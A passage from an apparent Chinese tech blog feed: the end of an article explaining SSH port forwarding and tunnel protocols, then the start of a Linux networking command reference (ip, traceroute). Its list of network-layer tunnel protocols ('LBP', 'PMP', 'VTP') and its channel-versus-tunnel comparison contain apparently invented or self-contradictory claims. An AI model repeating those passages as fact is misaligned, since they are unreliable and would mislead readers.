<p>在ssh连接的基础上，指定 <code>ssh client</code> 或 <code>ssh server</code> 的某个端口作为源地址，所有发至该端口的数据包都会透过ssh连接被转发出去；至于转发的目标地址，目标地址既可以指定，也可以不指定，如果指定了目标地址，称为定向转发，如果不指定目标地址则称为动态转发：</p>
<p><strong>定向转发</strong></p>
<p>定向转发把数据包转发到指定的目标地址。目标地址不限定是ssh client 或 ssh server，既可以是二者之一，也可以是二者以外的其他机器。</p>
<p><strong>动态转发</strong></p>
<p>动态转发不指定目标地址，数据包转发的目的地是动态决定的。</p>
<h4 id="本地端口转发">本地端口转发</h4>
<p>本地转发中的本地是指将本地的某个端口(1024-65535)通过SSH隧道转发至其他主机的套接字，这样当我们的程序连接本地的这个端口时，其实间接连上了其他主机的某个端口，当我们发数据包到这个端口时数据包就自动转发到了那个远程端口上了</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20200730182255288.png" alt="image-20200730182255288"  /></p>
<h4 id="远程端口转发">远程端口转发</h4>
<p>远程转发和本地很相似，原理也差不多，但是不同的是，本地转发是在本地主机指定的一个端口，而远程转发是由SSH服务器经由SSH客户端转发，连接至目标服务器上。本质一样，区别在于需要转发的端口是在远程主机上还是在本地主机上</p>
<p>现在SSH就可以把连接从（39.104.112.253:80）转发到（10.0.0.10:85）。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20200730182352895.png" alt="image-20200730182352895"  /></p>
<h4 id="动态端口转发">动态端口转发</h4>
<p>定向转发（包括本地转发和远程转发）的局限性是必须指定某个目标地址，如果需要借助一台中间服务器访问很多目标地址，一个一个地定向转发显然不是好办法，这时就要用的是ssh动态端口转发，它相当于建立一个SOCKS服务器。各种应用经由SSH客户端转发，经过SSH服务器，到达目标服务器，不固定端口。</p>
<h3 id="ssh隧道的本质">SSH隧道的本质</h3>
<p><strong>SSH隧道可以被认为是一种应用层隧道</strong>，与其他隧道类型（如IPIP, VxLAN）不同的是，SSH隧道是基于SSH协议的一种应用，而IPIP, VxLAN这种，则是基于IP协议，UDP协议的一种封包机制。</p>
<p>SSH（<em><strong>Secure Shell</strong></em>）是一种网络协议，支持远程登录和其他安全网络服务的加密通信。SSH隧道属于SSH协议中的一种应用场景，用于在SSH加密连接上建立通信隧道。SSH隧道允许用户通过加密终端 (SSH客户端) 和远程服务之间的连接，在不暴露底层网络协议的信息（例如IP地址、端口号等）的情况下，传输数据。</p>
<p>SSH隧道工作方式如下：</p>
<ul>
<li>首先，在本地主机和目标服务器之间建立SSH连接，SSH连接是一条安全加密的连接管道，连接过程中对数据进行加密传输。</li>
<li>连接建立后，通过SSH隧道在本地主机和目标服务器之间建立一个TCP连接，并将本地主机上的数据通过SSH隧道加密传输到目标服务器，目标服务器接收数据，解密后将数据传输到最终目的地。</li>
<li>同样，当接收数据时，目标服务器会将数据加密再通过SSH隧道传输回本地主机。</li>
</ul>
<p>由于SSH隧道在SSH连接上建立通信隧道，因此可以将其视为应用层隧道。应用层隧道是在应用层协议上建立的隧道，用于将应用程序传输的数据加密传输到目标地址。SSH隧道给用户提供了一种安全的数据通信方法，在安全性上比普通TCP/IP连接更具有优势。</p>
<p>SSH隧道也可以成为一种代理模式，常用于越过不可访问的网络时使用</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/1%20s8z9sil7EnwspH77kdrzjg.webp" alt="1 s8z9sil7EnwspH77kdrzjg"  /></p>
<center>图：SSH隧道应用图解</center>
<center><em>Source：</em>https://infosecwriteups.com/bypass-the-firewall-with-ssh-tunnelling-711fa78ea97f</center><br>
<h3 id="其他隧道协议">其他隧道协议</h3>
<p>对于隧道，上面也提到了，隧道就是网络数据包封包一种协议，那就是说很多常见的协议其实都是隧道技术</p>
<ul>
<li>工作与数据链路层的隧道技术：
<ol>
<li>PPP隧道协议（Point-to-Point Protocol）：PPP隧道协议是一种在两个点之间建立可靠连接的协议，它能够在一条串行线路上同时传输多种网络层协议。PPP隧道协议通过在两个点之间建立隧道，将其他协议的数据封装起来进行传输。</li>
<li>L2TP协议（Layer 2 Tunnel Protocol）：L2TP协议是一种在不安全的公共网络上传输数据的加密协议，常用于建立VPN（Virtual Private Network）隧道。L2TP协议将PPP协议属性和L2TP控制消息封装在IP（Internet Protocol）数据报中。</li>
<li>PPTP协议（Point-to-Point Tunneling Protocol）：PPTP协议是一种在不安全的公共网络上传输数据的加密协议，也常用于建立VPN隧道。PPTP协议通过在数据包中添加PPTP头和PPP协议数据负载来传输数据。</li>
<li>GRE协议（Generic Routing Encapsulation）：GRE协议是一种通用路由封装协议，它可以将其他协议的数据封装在IP数据报中进行传输。GRE协议主要用于连接不同类型的网络，通常用于建立VPN隧道。</li>
</ol>
</li>
<li>工作与网络层的隧道协议：
<ol>
<li>负载均衡协议 (LBP) 是一种在网络层以上实现的协议，用于在二层 (链路层) 上实现数据包的转发。LBP 可以将数据包转发到多个服务器上，从而实现负载均衡。LBP 可以用于实现网站负载均衡、存储集群等功能。</li>
<li>协议映射协议 (PMP) 是一种在网络层以下实现的协议，用于在网络层以上实现数据包的映射。PMP  可以将一个数据包映射到另一个数据包中，从而实现数据包的转发。PMP 可以用于实现虚拟专用网络 (Virtual Private  Network,VPN) 和防火墙等功能。</li>
<li>虚拟隧道协议 (Virtual Tunneling Protocol,VTP) 是一种在网络层以下实现的协议，用于在网络中创建和管理隧道。VTP 可以将一个网络中的多个子网互联，使得数据包可以在这些子网之间传输。VTP 可以用于实现数据包的路由、负载均衡和安全性等方面。</li>
</ol>
</li>
<li>工作与应用层的隧道技术：
<ol>
<li>HTTP隧道：HTTP隧道通过HTTP连接创建隧道，将其他协议的数据封装在HTTP报文中，传输到目标地址。HTTP隧道通常用于访问受限制的服务器，如防火墙后的服务器。</li>
<li>SSL/TLS隧道：SSL/TLS隧道也是基于加密传输的应用层隧道。通过SSL/TLS加密传输，将通信数据封装在加密连接中，传输到目标服务器。SSL/TLS隧道通常用于保护Web应用程序中传输的机密数据。</li>
<li>SOCKS代理隧道：SOCKS代理隧道是一种应用层代理协议，用于将流量转发到目标地址并代理转发返回数据。SOCKS代理隧道通常用于隐藏客户端的真实IP地址和身份。</li>
<li>DNS隧道：DNS隧道是通过将数据封装在DNS请求或响应中来传输数据的应用层隧道。DNS隧道通常被用于绕过安全防护措施或访问受限制的服务器。</li>
</ol>
</li>
</ul>
<h2 id="ccp常提到的非法信道中的信道和隧道是一样的吗">CCP常提到的“非法信道”中的“信道”和“隧道”是一样的吗？</h2>
<p>首先，“信道”和“隧道” 是两种不同的概念，就和“男人”和“女人”一样，同属于人但完全不同，常见的表示形式如下：</p>
<ol>
<li>意义不同：<strong>信道</strong>是指物理媒介或虚拟路径，用于数据的传输，例如网络电缆或无线信道。<strong>隧道</strong>则是一种逻辑隧道，通过在底层通信协议的基础上创建加密通道来传输数据。</li>
<li>位置不同：<strong>信道</strong>通常是指在通信的物理媒介上的传输路径，而<strong>隧道</strong>则是在信道之上的OSI模型层协上创建加密通道的逻辑概念。</li>
<li>传输方式不同：<strong>信道</strong>是直接用于传输数据的物理媒介，信号通过信道进行传输；<strong>隧道</strong>则是在传输数据时，将数据封装成新的协议格式，通过信道进行加密传输。</li>
<li>使用场景不同：<strong>信道</strong>常用于介质访问控制、传输层控制、传输介质选择等方面，例如在局域网中使用以太网电缆传送数据。<strong>隧道</strong>则通常用于保障企业内部网络安全、建立虚拟专用网络、跨越防火墙等隧道服务需求。</li>
<li>技术特点不同：<strong>信道</strong>是一种物理层或数据链路层技术，而<strong>隧道</strong>是一种应用层或数据链路层技术。</li>
</ol>
]]></content:encoded>
    </item>
    
    <item>
      <title>长期总结 - Linux网络命令合集</title>
      <link>https://www.oomkill.com/2021/01/linux-network-command/</link>
      <pubDate>Mon, 18 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://www.oomkill.com/2021/01/linux-network-command/</guid>
      <description></description>
      <content:encoded><![CDATA[<h2 id="overview">Overview</h2>
<p>作为系统管理员或程序员，经常需要诊断分析和解决网络问题，而配置、监控与保护网络有助于发现问题并在事情范围扩大前得意解决，并且网络的性能与安全也是管理与诊断网络的重要部分。本文将总结常用与Linux网络管理的命令与使用示例，保持长期更新与更正。</p>
<h2 id="ip">IP</h2>
<p><code>iproute2</code> 包含网络、路由、ARP缓存等的管理与配置的<code>ip</code>命令，用来取代传统的 <code>ifconfig</code> 与 <code>route</code>；<code>ip</code> 使用第二个参数，指定在对象执行的操作（例如，<code>add</code> <code>delete</code> <code>show</code>）。</p>
<p>ip 命令是配置网络接口的强大工具，任何 Linux 系统管理员都应该知道。它用于启动或关闭接口、分配和删除地址和路由、管理 ARP 缓存等等。</p>
<p><code>ip</code> 常用的子命令有：</p>
<ul>
<li><code>link</code> (<code>l</code>)  网络接口管理</li>
<li><code>address</code> (<code>a</code>)  IP地址管理</li>
<li><code>route</code> (<code>r</code>)  路由表管理</li>
<li><code>neigh</code> (<code>n</code>)  arp表管理</li>
</ul>
<blockquote>
<p><strong>各系统下的包名与安装</strong></p>
<ul>
<li>Ubuntu/Debian: <code>iproute2</code>  ；<code>apt install iproute2</code></li>
<li>CentOS/Fedora: <code>iproute2</code> ；<code>yum install -y iproute2</code></li>
<li>Apline：<code>iproute2 </code> ；<code>apk add iproute2</code></li>
</ul>
</blockquote>
<h3 id="ip-link">ip link</h3>
<p><code>ip link</code> 用于管理和显示网络接口</p>
<h3 id="获取网络接口信息ip-link-show">获取网络接口信息ip link show</h3>
<p>查看特定设备信息</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip link show dev <span class="o">[</span>device<span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>查看所有网络接口的统计信息（如传输或丢弃的数据包，错误等等）：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip -s link
</span></span></code></pre></td></tr></table>
</div>
</div><p>查看单个网络接口的类似信息：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip -s link ls <span class="o">[</span>interface<span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>例如</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ ip -s link ls eth0
</span></span><span class="line"><span class="cl">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq state UP mode DEFAULT group default qlen 1000
</span></span><span class="line"><span class="cl">    link/ether da:78:c8:7a:fb:26 brd ff:ff:ff:ff:ff:ff
</span></span><span class="line"><span class="cl">    RX: bytes  packets  errors  dropped overrun mcast   
</span></span><span class="line"><span class="cl">    38626072259 324723879 0       347316  0       0       
</span></span><span class="line"><span class="cl">    TX: bytes  packets  errors  dropped carrier collsns 
</span></span><span class="line"><span class="cl">    13404948080 6829250  0       0       0       0       
</span></span></code></pre></td></tr></table>
</div>
</div><p>如果需要显示更多的详情，可以再添加一个 <code>-s</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip -s -s link ls <span class="o">[</span>interface<span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>仅查看启动（运行）的接口列表</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip link ls up
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="修改网络接口信息-ip-link-set">修改网络接口信息 ip link set</h3>
<p>查看 <code>ip link</code> 的帮助</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip link <span class="nb">help</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>启动/关闭网络接口</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip link <span class="nb">set</span> <span class="o">[</span>interface<span class="o">]</span> up/down
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>ip link</code> 可以修改设备传输队列的长度</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip link <span class="nb">set</span> txqueuelen <span class="o">[</span>number<span class="o">]</span> dev <span class="o">[</span>interface<span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>设置 <strong>MTU</strong> (Maximum Transmission Unit) 来提高网络性能</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip link <span class="nb">set</span> mtu <span class="o">[</span>number<span class="o">]</span> dev <span class="o">[</span>interface<span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>###查看与管理IP地址 ip addr</p>
<p>显示所有设备</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip addr 
</span></span></code></pre></td></tr></table>
</div>
</div><p>列出网络接口与IP地址</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip addr show
</span></span></code></pre></td></tr></table>
</div>
</div><p>查看单个网络设备的信息</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip addr show dev <span class="o">[</span>interface<span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>列出 IPv4/IPv6 地址</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip -4 addr
</span></span><span class="line"><span class="cl">ip -6 addr
</span></span></code></pre></td></tr></table>
</div>
</div><p>在Linux中添加网络地址</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip addr add <span class="o">[</span>ip_address<span class="o">]</span> dev <span class="o">[</span>interface<span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>添加广播地址</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip addr add brd <span class="o">[</span>ip_address<span class="o">]</span> dev <span class="o">[</span>interface<span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>删除接口上的网络地址</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip addr del <span class="o">[</span>ip_address<span class="o">]</span> dev <span class="o">[</span>interface<span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="管理路由表-ip-route">管理路由表 ip route</h3>
<h3 id="显示路由表-ip-route-list">显示路由表 ip route list</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip route
</span></span><span class="line"><span class="cl">ip route list
</span></span></code></pre></td></tr></table>
</div>
</div><p>选择范围；上述命令列出内核内所有路由条目，如果想要缩小范围可以使用选择器 SELECTOR</p>
<p>语法：<code>ip route list SELECTOR</code></p>
<p><strong>SELECTOR</strong>:</p>
<ul>
<li>
<p><strong>root</strong>：[ local | main | default | all | NUMBER ]</p>
</li>
<li>
<p><strong>match</strong>：</p>
<p>[ match PREFIX ]</p>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> ip route list match <span class="m">10</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p><strong>exact</strong>： [ exact PREFIX ]</p>
</li>
<li>
<p><strong>TABLE</strong></p>
<p>[ table TABLE_ID ] [ local | main | default | all | NUMBER ]</p>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> ip route list table <span class="nb">local</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> broadcast 127.0.0.0 dev lo proto kernel scope link src 127.0.0.1 
</span></span><span class="line"><span class="cl"> <span class="nb">local</span> 127.0.0.0/8 dev lo proto kernel scope host src 127.0.0.1 
</span></span><span class="line"><span class="cl"> <span class="nb">local</span> 127.0.0.1 dev lo proto kernel scope host src 127.0.0.1 
</span></span><span class="line"><span class="cl"> broadcast 127.255.255.255 dev lo proto kernel scope link src 127.0.0.1 
</span></span><span class="line"><span class="cl"> broadcast 195.133.10.0 dev eth0 proto kernel scope link src 195.133.11.43 
</span></span><span class="line"><span class="cl"> <span class="nb">local</span> 195.133.11.43 dev eth0 proto kernel scope host src 195.133.11.43 
</span></span><span class="line"><span class="cl"> broadcast 195.133.11.255 dev eth0 proto kernel scope link src 195.133.11.43 
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p><strong>PROTO</strong></p>
<p>[ proto RTPROTO ] [ kernel | boot | static | NUMBER ]</p>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> ip route list proto static
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p><strong>TYPE</strong></p>
<p>[ type TYPE ] { unicast | local | broadcast | multicast | throw |unreachable | prohibit | blackhole | nat }</p>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> ip route list type multicast
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p><strong>SCOPE</strong></p>
<p>[ scope SCOPE ] [ host | link | global | NUMBER ]</p>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> ip route list scope link
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> 169.254.0.0/16 dev eth0 metric 1002 
</span></span><span class="line"><span class="cl"> 172.16.0.0/20 dev eth0 proto kernel src 172.16.0.2 
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="修改路由表-ip-route-adddel">修改路由表 ip route add/del</h3>
<p>在指定设备上添加路由条目</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip route add <span class="o">[</span>ip_address<span class="o">]</span> dev <span class="o">[</span>interface<span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>通过网关添加新路由</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip route add <span class="o">[</span>ip_address<span class="o">]</span> via <span class="o">[</span>gatewayIP<span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>通过本地网关为<strong>所有</strong>地址添加默认路由</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip route add default <span class="o">[</span>ip_address<span class="o">]</span> dev <span class="o">[</span>device<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ip route add default <span class="o">[</span>network/mask<span class="o">]</span> via <span class="o">[</span>gatewayIP<span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>删除已经存在的路由表</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip route del <span class="o">[</span>ip_address<span class="o">]</span>
</span></span><span class="line"><span class="cl">ip route del default
</span></span><span class="line"><span class="cl">ip route del <span class="o">[</span>ip_address<span class="o">]</span> dev <span class="o">[</span>interface<span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="arp地址表管理--ip-neighbor">ARP地址表管理  ip neighbor</h3>
<h3 id="显示arp-条目-ip-neigh-show">显示arp 条目 ip neigh show</h3>
<p>显示系统中设备的MAC地址及其状态。设备存在的状态：</p>
<table>
<thead>
<tr>
<th>状态</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>REACHABLE</strong></td>
<td>在超时过期之前有效且可访问的条目</td>
</tr>
<tr>
<td><strong>PERMANENT</strong></td>
<td>管理员才能删除的永久条目</td>
</tr>
<tr>
<td><strong>STALE</strong></td>
<td>有效但无法访问的条目；为了检查它的状态，内核在第一次传输时检查</td>
</tr>
</tbody>
</table>
<p>例如</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip neigh show
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">192.168.10.1 dev eth0 lladdr 00:1f:ce:72:bd:8c REACHABLE
</span></span><span class="line"><span class="cl">46.17.40.155 dev eth0 lladdr c4:71:fe:f1:9f:3f STALE
</span></span><span class="line"><span class="cl">2a00:b700:3::1 dev eth0 lladdr 00:1f:ce:72:bd:8c router STALE
</span></span><span class="line"><span class="cl">fe80::f0c5:a5ff:fee8:2aa4 dev eth0 lladdr f2:c5:a5:e8:2a:a4 router STALE
</span></span><span class="line"><span class="cl">fe80::a48a:1eff:fe35:c2f7 dev eth0 lladdr a6:8a:1e:35:c2:f7 router STALE
</span></span><span class="line"><span class="cl">fe80::4c4d:b3ff:fe44:fd58 dev eth0 lladdr 4e:4d:b3:44:fd:58 router STALE
</span></span><span class="line"><span class="cl">fe80::4c33:dfff:fe92:9f2f dev eth0 lladdr 4e:33:df:92:9f:2f router STALE
</span></span><span class="line"><span class="cl">fe80::21f:ceff:fe72:bd8c dev eth0 lladdr 00:1f:ce:72:bd:8c router STALE
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="修改arp条目-ip-neigh-adddel">修改arp条目 ip neigh add/del</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip neigh add <span class="o">[</span>ip_address<span class="o">]</span> dev <span class="o">[</span>interface<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ip neigh del <span class="o">[</span>ip_address<span class="o">]</span> dev <span class="o">[</span>interface<span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="traceroute">traceroute</h2>
<p><code>traceroute</code> 可以追踪数据传输是如何从本地传输到远程的。一个典型的例子是网页的访问。在互联网上加载一个网页需要数据流经一个网络和许多路由器。<code>traceroute</code> 可以显示所采用的路由以及网络上路由器的IP和主机名。它可以应用于排查网络延迟或诊断网络问题。</p>
<blockquote>
<p><strong>各系统下的包名与安装</strong></p>
<ul>
<li>Ubuntu/Debian: <code>traceroute</code>  ；<code>apt install traceroute -y</code></li>
<li>CentOS/Fedora: <code>traceroute</code> ；<code>yum install -y traceroute</code></li>
<li>Apline：<code>busybox </code> ；<code>apk add busybox</code></li>
</ul>
</blockquote>
<h3 id="追踪网络主机的路由-traceroute-host">追踪网络主机的路由 traceroute host</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">traceroute baidu.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">traceroute to baidu.com <span class="o">(</span>220.181.38.148<span class="o">)</span>, <span class="m">30</span> hops max, <span class="m">60</span> byte packets
</span></span><span class="line"><span class="cl"> <span class="m">1</span>  * 9.31.61.129 <span class="o">(</span>9.31.61.129<span class="o">)</span>  1.795 ms *
</span></span><span class="line"><span class="cl"> <span class="m">2</span>  9.31.123.98 <span class="o">(</span>9.31.123.98<span class="o">)</span>  0.907 ms  1.179 ms  1.416 ms
